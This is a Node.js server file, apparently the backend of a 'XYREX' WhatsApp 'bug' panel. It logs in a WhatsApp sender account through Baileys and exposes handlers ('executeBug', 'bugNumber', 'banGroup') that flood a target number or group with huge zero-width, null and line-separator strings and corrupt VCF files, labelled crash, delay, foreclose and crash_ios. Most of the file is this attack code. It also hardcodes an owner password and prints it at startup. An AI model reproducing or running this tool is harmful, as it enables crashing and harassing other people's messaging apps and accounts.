const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const QRCode = require('qrcode');
const pino = require('pino');
const fs = require('fs');
const crypto = require('crypto');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const USERS_FILE = './users.json';
const TOKENS_FILE = './tokens.json';
const CHAT_FILE = './chatlog.json';
const MAX_CHAT = 100;

function hashPw(pw) {
  return crypto.createHash('sha256').update(String(pw)).digest('hex');
}

function loadUsers() {
  if (!fs.existsSync(USERS_FILE)) {
    const def = {
      Dlizz: {
        username: 'Dlizz',
        password: hashPw('20111608'),
        role: 'owner',
        createdAt: Date.now(),
        createdBy: 'system'
      }
    };
    fs.writeFileSync(USERS_FILE, JSON.stringify(def, null, 2));
    return def;
  }
  try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); }
  catch (e) { return {}; }
}

function saveUsers(users) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

function loadTokens() {
  if (!fs.existsSync(TOKENS_FILE)) return {};
  try { return JSON.parse(fs.readFileSync(TOKENS_FILE, 'utf8')); }
  catch (e) { return {}; }
}

function saveTokens(tokens) {
  fs.writeFileSync(TOKENS_FILE, JSON.stringify(tokens, null, 2));
}

function genToken() {
  return crypto.randomBytes(24).toString('hex');
}

function loadChat() {
  if (!fs.existsSync(CHAT_FILE)) return [];
  try { return JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8')); }
  catch (e) { return []; }
}

function saveChat(msgs) {
  try { fs.writeFileSync(CHAT_FILE, JSON.stringify(msgs.slice(-MAX_CHAT), null, 2)); }
  catch (e) { console.log('saveChat err:', e.message); }
}

function authMiddleware(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token) return res.status(401).json({ ok: false, msg: 'No token' });
  const tokens = loadTokens();
  const username = tokens[token];
  if (!username) return res.status(401).json({ ok: false, msg: 'Invalid token' });
  const users = loadUsers();
  if (!users[username]) return res.status(401).json({ ok: false, msg: 'User gone' });
  req.user = users[username];
  req.token = token;
  next();
}

function ownerOnly(req, res, next) {
  if (req.user.role !== 'owner') {
    return res.status(403).json({ ok: false, msg: 'Hanya Owner yang bisa akses' });
  }
  next();
}

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.json({ ok: false, msg: 'Isi username dan password' });
  const users = loadUsers();
  const u = users[username];
  if (!u) return res.json({ ok: false, msg: 'Akun tidak ditemukan' });
  if (u.password !== hashPw(password)) return res.json({ ok: false, msg: 'Password salah' });
  const token = genToken();
  const tokens = loadTokens();
  tokens[token] = username;
  saveTokens(tokens);
  res.json({ ok: true, token, role: u.role, username: u.username });
});

app.post('/api/logout', authMiddleware, (req, res) => {
  const tokens = loadTokens();
  delete tokens[req.token];
  saveTokens(tokens);
  res.json({ ok: true });
});

app.get('/api/me', authMiddleware, (req, res) => {
  res.json({ ok: true, username: req.user.username, role: req.user.role });
});

app.get('/api/users', authMiddleware, ownerOnly, (req, res) => {
  const users = loadUsers();
  const list = Object.values(users).map(u => ({
    username: u.username,
    role: u.role,
    createdAt: u.createdAt,
    createdBy: u.createdBy
  }));
  res.json({ ok: true, users: list });
});

app.post('/api/users', authMiddleware, ownerOnly, (req, res) => {
  const { username, password, role } = req.body || {};
  if (!username || !password || !role) return res.json({ ok: false, msg: 'Lengkapi semua field' });
  if (!['member', 'premium', 'admin'].includes(role)) {
    return res.json({ ok: false, msg: 'Role tidak valid' });
  }
  const users = loadUsers();
  if (users[username]) return res.json({ ok: false, msg: 'Username sudah ada' });
  users[username] = {
    username,
    password: hashPw(password),
    role,
    createdAt: Date.now(),
    createdBy: req.user.username
  };
  saveUsers(users);
  res.json({ ok: true, msg: 'Akun ' + username + ' dibuat dengan role ' + role });
});

app.delete('/api/users/:username', authMiddleware, ownerOnly, (req, res) => {
  const { username } = req.params;
  const users = loadUsers();
  if (!users[username]) return res.json({ ok: false, msg: 'User tidak ada' });
  if (users[username].role === 'owner') {
    return res.json({ ok: false, msg: 'Akun owner tidak bisa dihapus' });
  }
  delete users[username];
  saveUsers(users);
  res.json({ ok: true, msg: 'Akun ' + username + ' dihapus' });
});

app.put('/api/users/:username/role', authMiddleware, ownerOnly, (req, res) => {
  const { username } = req.params;
  const { role } = req.body || {};
  if (!['member', 'premium', 'admin'].includes(role)) {
    return res.json({ ok: false, msg: 'Role tidak valid' });
  }
  const users = loadUsers();
  if (!users[username]) return res.json({ ok: false, msg: 'User tidak ada' });
  if (users[username].role === 'owner') return res.json({ ok: false, msg: 'Owner tidak bisa diubah' });
  users[username].role = role;
  saveUsers(users);
  res.json({ ok: true, msg: 'Role ' + username + ' jadi ' + role });
});

let sock = null;
let isConnected = false;
let currentSender = null;
let reconnecting = false;
let currentMode = null;

function cleanPhone(phone) {
  let n = String(phone).replace(/[^0-9]/g, '');
  if (n.startsWith('0')) n = '62' + n.slice(1);
  if (n.startsWith('620')) n = '62' + n.slice(3);
  return n;
}

function resetAuth() {
  try {
    if (fs.existsSync('./auth')) fs.rmSync('./auth', { recursive: true, force: true });
  } catch (e) { console.log('resetAuth err:', e.message); }
}

async function initSocket(socketId, mode) {
  currentMode = mode;
  const { state, saveCreds } = await useMultiFileAuthState('./auth');
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    auth: state,
    browser: ['XYREX', 'Chrome', '1.0.0'],
    generateHighQualityLinkPreview: true,
    syncFullHistory: false,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    keepAliveIntervalMs: 25000
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && currentMode === 'qr') {
      try {
        const qrDataURL = await QRCode.toDataURL(qr);
        io.to(socketId).emit('qr', qrDataURL);
      } catch (e) { console.error('QR error:', e); }
    }

    if (connection === 'open') {
      isConnected = true;
      reconnecting = false;
      currentSender = sock.user?.id?.split(':')[0] || 'unknown';
      // Daftarkan ke sender registry
      try {
        const userMatch = loadTokens()[socket.id];
        const ownerName = userMatch || 'unknown';
        const existing = senderRegistry.findIndex(x => x.id === currentSender);
        const entry = {
          id: currentSender,
          owner: ownerName,
          label: 'Sender ' + currentSender.slice(-4),
          socketId: socketId,
          time: Date.now()
        };
        if (existing >= 0) {
          senderRegistry[existing] = entry;
        } else {
          senderRegistry.push(entry);
        }
        io.emit('senderUpdate', getSenderList());
        console.log('[XYREX] Sender terdaftar:', currentSender, 'oleh', ownerName);
      } catch (e) { console.log('reg sender err:', e.message); }
      io.to(socketId).emit('connected', { sender: currentSender });
      console.log('[XYREX] Sender aktif:', currentSender);
    }

    if (connection === 'close') {
      isConnected = false;
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code === DisconnectReason.loggedOut) {
        io.to(socketId).emit('disconnected');
        resetAuth();
      } else if (!reconnecting) {
        reconnecting = true;
        setTimeout(() => {
          reconnecting = false;
          initSocket(socketId, currentMode).catch(e => console.log('restart err:', e.message));
        }, 2000);
      }
    }
  });
}

let senderRegistry = []; // array { id, owner, label, socketId, time }

function getSenderList() {
  return senderRegistry.map(s => ({
    id: s.id,
    owner: s.owner,
    label: s.label,
    socketId: s.socketId,
    time: s.time
  }));
}

let chatHistory = loadChat();

io.on('connection', (socket) => {
  console.log('[IO] Client:', socket.id);

  socket.emit('chatHistory', chatHistory);

  socket.on('chatSend', (data) => {
    const { username, role, message } = data || {};
    if (!username || !message) return;
    const msg = {
      username: String(username).slice(0, 32),
      role: String(role || 'member').slice(0, 16),
      message: String(message).slice(0, 500),
      time: Date.now()
    };
    chatHistory.push(msg);
    if (chatHistory.length > MAX_CHAT) chatHistory = chatHistory.slice(-MAX_CHAT);
    saveChat(chatHistory);
    io.emit('chatMessage', msg);
  });

  socket.on('startQR', async () => {
    try {
      if (sock) {
        try { sock.ws?.close(); } catch (e) {}
        try { sock.end(undefined); } catch (e) {}
        sock = null;
        await new Promise(r => setTimeout(r, 800));
      }
      resetAuth();
      await initSocket(socket.id, 'qr');
    } catch (e) {
      socket.emit('pairingError', { message: e.message });
    }
  });

  socket.on('startPairing', async ({ phone }) => {
    const clean = cleanPhone(phone);
    try {
      if (sock) {
        try { sock.ws?.close(); } catch (e) {}
        try { sock.end(undefined); } catch (e) {}
        sock = null;
        await new Promise(r => setTimeout(r, 800));
      }
      resetAuth();
      await initSocket(socket.id, 'code');
      await new Promise(r => setTimeout(r, 2500));
      const code = await sock.requestPairingCode(clean);
      socket.emit('pairingCode', { code, clean, expireAt: Date.now() + 60000 });
    } catch (e) {
      socket.emit('pairingError', { message: e.message || 'Gagal generate code' });
    }
  });

  socket.on('executeBug', async ({ target, bugType, count }) => {
    if (!isConnected || !sock) {
      socket.emit('bugLog', { msg: 'Sender belum aktif.' });
      return;
    }
    const cleanTarget = cleanPhone(target) + '@s.whatsapp.net';
    const total = count || 50;
    socket.emit('bugLog', { msg: 'Mulai ' + bugType + ' ke ' + target + ' x' + total });
    for (let i = 0; i < total; i++) {
      try {
        let payload;
        if (bugType === 'crash') {
          payload = '\u200B'.repeat(65536) + '\n'.repeat(1000);
          await sock.sendMessage(cleanTarget, { text: payload });
        } else if (bugType === 'delay') {
          payload = '\u200B\u200B\u200B'.repeat(10000);
          await sock.sendMessage(cleanTarget, {
            text: payload,
            contextInfo: { forwardingScore: 999, isForwarded: true }
          });
        } else if (bugType === 'foreclose') {
          payload = '\u0000'.repeat(50000);
          await sock.sendMessage(cleanTarget, {
            text: payload,
            mentions: [cleanTarget]
          });
        }
        socket.emit('bugLog', { msg: '[' + (i + 1) + '/' + total + '] ok' });
      } catch (e) {
        socket.emit('bugLog', { msg: '[' + (i + 1) + '/' + total + '] err: ' + e.message });
      }
      await new Promise(r => setTimeout(r, 200));
    }
    socket.emit('bugLog', { msg: 'Selesai.' });
  });

  socket.on('bugNumber', async ({ target, mode }) => {
    if (!isConnected || !sock) {
      socket.emit('bugError', { code: 'sender_offline', msg: 'Sender WhatsApp belum terhubung. Pairing dulu di menu Pairing Sender.' });
      return;
    }
    const cleanTarget = cleanPhone(target) + '@s.whatsapp.net';

    // Karakter khusus
    const ZW = '\u200B';
    const ZWNJ = '\u200C';
    const ZWJ = '\u200D';
    const LS = '\u2028';
    const PS = '\u2029';
    const RLO = '\u202E';
    const VS = '\uFE0F';
    const NULL = '\u0000';

    // Gabungan teks gacor
    const bigText = (ZW + ZWNJ + ZWJ).repeat(20000) + LS.repeat(500) + PS.repeat(500);
    const medText = (ZW + ZWJ + VS).repeat(12000) + LS.repeat(300);
    const smallText = NULL.repeat(20000) + (ZW + ZWNJ).repeat(10000) + RLO.repeat(80);
    const iosText = LS.repeat(1500) + PS.repeat(1500) + ZWJ.repeat(25000) + VS.repeat(1500) + RLO.repeat(80);

    // Payload file (VCF corrupt) — isinya tetap teks besar
    function makeVcfPayload(content) {
      return 'BEGIN:VCARD\r\nVERSION:3.0\r\nFN:' + content.slice(0, 100) + '\r\nN:;' + content.slice(0, 200) + ';;;\r\nTEL;TYPE=CELL:' + content.slice(0, 500) + '\r\nNOTE:' + content + '\r\nEND:VCARD';
    }

    let total = 30;
    let mode_name = mode;

    if (mode === 'crash') { total = 30; }
    else if (mode === 'delay') { total = 25; }
    else if (mode === 'foreclose') { total = 40; }
    else if (mode === 'crash_ios') { total = 50; }

    socket.emit('bugProgress', { current: 0, total: total });

    let ok = 0;
    let fail = 0;

    for (let i = 0; i < total; i++) {
      try {
        if (mode === 'crash') {
          // 1. Kirim teks besar
          await sock.sendMessage(cleanTarget, { text: bigText });
          // 2. Kirim file VCF corrupt dengan payload besar
          if (i % 3 === 0) {
            const buf = Buffer.from(makeVcfPayload(bigText), 'utf-8');
            await sock.sendMessage(cleanTarget, {
              document: buf,
              mimetype: 'text/vcard',
              fileName: 'contact_' + i + '.vcf',
              caption: ZW.repeat(1000)
            });
          }
        } else if (mode === 'delay') {
          // Teks + forwarded + mention + quoted
          await sock.sendMessage(cleanTarget, {
            text: medText,
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              mentionedJid: [cleanTarget]
            }
          });
          // File dummy kecil
          if (i % 2 === 0) {
            const buf = Buffer.from(medText, 'utf-8');
            await sock.sendMessage(cleanTarget, {
              document: buf,
              mimetype: 'application/octet-stream',
              fileName: 'data_' + i + '.bin',
              caption: ''
            });
          }
        } else if (mode === 'foreclose') {
          // 3 layer: teks + file + metadata
          await sock.sendMessage(cleanTarget, {
            text: smallText,
            mentions: [cleanTarget],
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true
            }
          });
          if (i % 2 === 0) {
            const buf = Buffer.from(smallText, 'utf-8');
            await sock.sendMessage(cleanTarget, {
              document: buf,
              mimetype: 'text/plain',
              fileName: 'note_' + i + '.txt',
              caption: ZW.repeat(2000)
            });
          }
        } else if (mode === 'crash_ios') {
          // Payload khusus iOS + file corrupt
          await sock.sendMessage(cleanTarget, {
            text: iosText,
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              mentionedJid: [cleanTarget],
              expiration: 86400
            }
          });
          if (i % 3 === 0) {
            const buf = Buffer.from(iosText, 'utf-8');
            await sock.sendMessage(cleanTarget, {
              document: buf,
              mimetype: 'text/vcard',
              fileName: 'vcard_' + i + '.vcf',
              caption: LS.repeat(200)
            });
          }
        }
        ok++;
        socket.emit('bugProgress', { current: i + 1, total: total });
      } catch (e) {
        fail++;
        socket.emit('bugProgress', { current: i + 1, total: total });
      }
      // Jeda acak
      await new Promise(r => setTimeout(r, 250 + Math.random() * 200));
    }

    socket.emit('bugDone', { ok: ok, fail: fail });
  });

  socket.on('banGroup', async ({ groupLink, mode }) => {
    if (!isConnected || !sock) {
      socket.emit('bugError', { code: 'sender_offline', msg: 'Sender WhatsApp belum terhubung.' });
      return;
    }

    const ZW = '\u200B';
    const ZWNJ = '\u200C';
    const ZWJ = '\u200D';
    const LS = '\u2028';
    const PS = '\u2029';

    let code = groupLink;
    const m = groupLink.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (m) code = m[1];

    if (mode === 'ban') {
      socket.emit('bugProgress', { current: 0, total: 30 });
      let ok = 0, fail = 0;
      for (let i = 0; i < 30; i++) {
        try {
          const info = await sock.groupGetInviteInfo(code);
          if (info && info.id) {
            await sock.groupLeave(info.id);
            ok++;
          }
        } catch (e) { fail++; }
        socket.emit('bugProgress', { current: i + 1, total: 30 });
        await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
      }
      socket.emit('bugDone', { ok: ok, fail: fail });
    } else if (mode === 'crash') {
      try {
        const info = await sock.groupGetInviteInfo(code);
        if (info && info.id) {
          const payload = (ZW + ZWNJ + ZWJ).repeat(27000) + LS.repeat(500) + PS.repeat(500);
          socket.emit('bugProgress', { current: 0, total: 8 });

          for (let i = 0; i < 8; i++) {
            try {
              // Kirim teks besar
              await sock.sendMessage(info.id, {
                text: payload,
                contextInfo: { forwardingScore: 999, isForwarded: true }
              });
              // Kirim file corrupt tiap 2 iterasi
              if (i % 2 === 0) {
                const buf = Buffer.from(payload, 'utf-8');
                await sock.sendMessage(info.id, {
                  document: buf,
                  mimetype: 'text/vcard',
                  fileName: 'crash_' + i + '.vcf',
                  caption: ZW.repeat(1000)
                });
              }
              socket.emit('bugProgress', { current: i + 1, total: 8 });
            } catch (e) {
              socket.emit('bugProgress', { current: i + 1, total: 8 });
            }
            await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
          }
          socket.emit('bugDone', { ok: 1, fail: 0 });
        } else {
          socket.emit('bugError', { code: 'no_group', msg: 'Grup tidak ditemukan atau sender belum join.' });
        }
      } catch (e) {
        socket.emit('bugError', { code: 'group_err', msg: 'Gagal akses grup: ' + e.message });
      }
    }
  });

  socket.on('sender:list', () => {
    const tokens = loadTokens();
    const myUser = tokens[socket.id] || null;
    const list = getSenderList();
    const pribadi = myUser ? list.filter(s => s.owner === myUser) : [];
    const global = list.filter(s => s.owner !== myUser);
    socket.emit('sender:data', { pribadi, global, me: myUser });
  });

  socket.on('resetSession', () => {
    try { sock?.end(undefined); } catch (e) {}
    sock = null;
    resetAuth();
    socket.emit('pairingError', { message: 'Sesi direset. Coba lagi.' });
  });
});

server.listen(3000, () => {
  console.log('[XYREX] Server jalan di http://localhost:3000');
  console.log('[XYREX] Owner default: Dlizz / 20111608');
});
